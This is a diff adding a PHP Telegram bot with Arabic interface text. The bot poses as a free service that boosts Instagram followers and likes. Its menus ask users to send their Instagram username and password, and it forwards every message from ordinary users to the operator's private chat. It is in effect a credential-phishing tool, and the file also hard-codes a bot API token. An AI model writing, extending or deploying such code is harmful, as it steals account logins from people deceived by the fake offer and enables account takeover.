@@ -1,0 +1,238 @@
+<?php 
+
+ob_start();
+$API_KEY = '1521326897:AAFiBTiv1jz6nUrda41QvTurVtRQ3bnJqyk'; #توكنك
+define('API_KEY',$API_KEY);
+echo file_get_contents("https://api.telegram.org/bot" . API_KEY . "/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME']);
+function bot($method,$datas=[]){
+$hhzZz = http_build_query($datas);
+$url = "https://api.telegram.org/bot".API_KEY."/".$method."?$hhzZz";
+$vhhhhh = file_get_contents($url);
+ return json_decode($vhhhhh);
+}
+$update = json_decode(file_get_contents('php://input'));
+$message = $update->message;
+$chat_id = $message->chat->id;
+$text = $message->text;
+$sudo = 872013743; # ايديك
+$chat_id2 = $update->callback_query->message->chat->id;
+$message_id2 = $update->callback_query->message->message_id;
+$data = $update->callback_query->data;
+$name = $message->from->first_name;
+$user = $message->from->username;
+$from_id = $message->from->id;
+$tws = file_get_contents("tw.txt");
+$message = $update->message;
+$chat_id = $message->chat->id;
+$text = $message->text;
+$chat_id2 = $update->callback_query->message->chat->id;
+$message = $update->message;
+$chat_id = $message->chat->id;
+$message_id2 = $update->callback_query->message->message_id;
+$data = $update->callback_query->data;
+$from_id = $message->from->id;
+$fromid= $update->callback_query->from->id;
+$data_name = $update->callback_query->from->first_name;
+$datatag_name = "[$data_name](tg://user?id=$fromid";
+$name = $update->message->from->first_name;
+$from_id = $message->from->id;
+$u = explode("\n",file_get_contents("memb.txt"));
+$c = count($u)-1;
+$modxe = file_get_contents("usr.txt");
+$username = $update->message->from->username;
+$reply = $message->reply_to_message->message_id;
+$list = file_get_contents("blocklist.txt");
+$rep = $message->reply_to_message->forward_from; 
+$id = $rep->id; 
+$K5 = file_get_contents("k.txt");
+$K6 = file_get_contents("k1.txt");
+$message = $update->message;
+$chat_id = $message->chat->id;
+$textmsg = $message->text;
+$user = $message->from->username;
+$name = $message->from->first_name;
+$for = $message->from->id;
+$text = $message->text;
+$chat_id2 = $update->callback_query->message->chat->id;
+$message = $update->message;
+$chat_id = $message->chat->id;
+$message_id2 = $update->callback_query->message->message_id;
+$data = $update->callback_query->data;
+$from_id = $message->from->id;
+$name = $update->message->from->first_name;
+$from_id = $message->from->id;
+$k5 = file_get_contents("data/k5.txt");
+$k6 = file_get_contents("data/k6.txt");
+$k7 = file_get_contents("data/k7.txt");
+$k99 = file_get_contents("data/k99.txt");
+$admin2 = file_get_contents("admin2.txt");
+$ad = array("$admin","$admin2");
+
+if($text ==  '/start'){
+bot('sendMessage',[
+ 'chat_id'=>$chat_id,
+ 'text'=>"*
+┄•🔅•┄༻📯༺┄•🔅•┄  
+📮¦ عزيزي ⋙「 $from_id 」
+💌 » في بوت رشق لايك و اعضا انستا
+💌 » عزيزي اختر عدد اعضاء
+💌 » و ثم قم بتباع خطوات البوت
+💌 » رشق نار و سريع و الكل يتفاعلون
+┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+📡┇Ch ~⪼ @IHlHII➕ »*
+",'parse_mode'=>'MarkDown', 'disable_web_page_preview'=>true, 'reply_to_message_id'=>$message->message_id,
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"⌯250⌯👤", 'callback_data'=>'add1'],['text'=>"⌯500⌯👤", 'callback_data'=>'add2']],
+[['text'=>"⌯750⌯👤", 'callback_data'=>'add3'],['text'=>"⌯1000⌯👤", 'callback_data'=>'add4']],
+]
+])]);
+}
+
+ /*===== dev ~ @K63_K =====*/
+
+if($data=="home"){
+bot('editMessageText',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id,
+'text'=>"*
+┄•🔅•┄༻📯༺┄•🔅•┄  
+💌 » في بوت رشق لايك و اعضا انستا
+💌 » عزيزي اختر عدد اعضاء
+💌 » و ثم قم بتباع خطوات البوت
+💌 » رشق نار و سريع و الكل يتفاعلون
+┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+📡┇Ch ~⪼ @IHlHII➕ »*
+",'reply_to_message_id'=>$message->message_id,
+'disable_web_page_preview'=> true ,
+ 'parse_mode'=>"Markdown",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"⌯250⌯👤", 'callback_data'=>'add1'],['text'=>"⌯500⌯👤", 'callback_data'=>'add2']],
+[['text'=>"⌯750⌯👤", 'callback_data'=>'add3'],['text'=>"⌯1000⌯👤", 'callback_data'=>'add4']],
+]
+])]);
+}
+
+if($data == "add1"){
+bot('editMessageText',[
+ 'chat_id'=>$chat_id2,
+ 'message_id'=>$message_id,
+'text'=>"
+- اهلأ عزيزي رشق مجاني بمناسبة 
+- اقتراب شهر رمضان بعد شهر رمضان
+- يصير لبوت ب $ شغال 
+- لرشق 250عضو 
+- دز يوزر + باسورد 
+- كمثال 
+-User:  j.2j__
+- pas: mohammddd
+",
+'disable_web_page_preview'=> true ,
+ 'parse_mode'=>"Markdown",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"", 'callback_data'=>'mp3']],
+[['text'=>"- رجوع", 'callback_data'=>'home']],
+]
+])]);
+}
+
+/*===== dev ~ @K63_K =====*/
+
+if($data == "add2"){
+bot('editMessageText',[
+ 'chat_id'=>$chat_id2,
+ 'message_id'=>$message_id,
+'text'=>"
+- اهلأ عزيزي رشق مجاني بمناسبة 
+- اقتراب شهر رمضان بعد شهر رمضان
+- يصير لبوت ب $ شغال 
+- لرشق 500عضو
+- دز يوزر + باسورد 
+- كمثال 
+-User:  j.2j__
+- pas: mohammddd
+",
+'disable_web_page_preview'=> true ,
+ 'parse_mode'=>"Markdown",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"", 'callback_data'=>'mp3']],
+[['text'=>"- رجوع", 'callback_data'=>'home']],
+]
+])]);
+}
+
+/*===== dev ~ @K63_K =====*/
+
+if($data == "add3"){
+bot('editMessageText',[
+ 'chat_id'=>$chat_id2,
+ 'message_id'=>$message_id,
+'text'=>"
+- اهلأ عزيزي رشق مجاني بمناسبة 
+- اقتراب شهر رمضان بعد شهر رمضان
+- يصير لبوت ب $ شغال 
+- لرشق 750عضو
+- دز يوزر + باسورد 
+- كمثال 
+-User:  j.2j__
+- pas: mohammddd
+",
+'disable_web_page_preview'=> true ,
+ 'parse_mode'=>"Markdown",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"", 'callback_data'=>'mp3']],
+[['text'=>"- رجوع", 'callback_data'=>'home']],
+]
+])]);
+}
+
+if($data == "add4"){
+bot('editMessageText',[
+ 'chat_id'=>$chat_id2,
+ 'message_id'=>$message_id,
+'text'=>"
+- اهلأ عزيزي رشق مجاني بمناسبة 
+- اقتراب شهر رمضان بعد شهر رمضان
+- يصير لبوت ب $ شغال 
+- لرشق 1000عضو
+- دز يوزر + باسورد 
+- كمثال 
+-User:  j.2j__
+- pas: mohammddd
+",
+'disable_web_page_preview'=> true ,
+ 'parse_mode'=>"Markdown",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"", 'callback_data'=>'mp3']],
+[['text'=>"- رجوع", 'callback_data'=>'home']],
+]
+])]);
+}
+
+/*===== dev ~ @K63_K =====*/
+
+if($text and $from_id != $sudo){
+bot('forwardMessage',[
+'chat_id'=>$sudo,
+'from_chat_id'=>$chat_id,
+  'message_id'=>$update->message->message_id,
+'text'=>$text,
+]);
+}
+if($message->reply_to_message->forward_from->id and $from_id == $sudo){
+    bot('sendMessage',[
+       'chat_id'=>$message->reply_to_message->forward_from->id,
+        'text'=>$text,
+    ]);
+    bot('sendmessage',[
+       'chat_id'=>$sudo,
+        'text'=>"
+⌔︙تم ارسال رسالتك
+",
+]);
+}
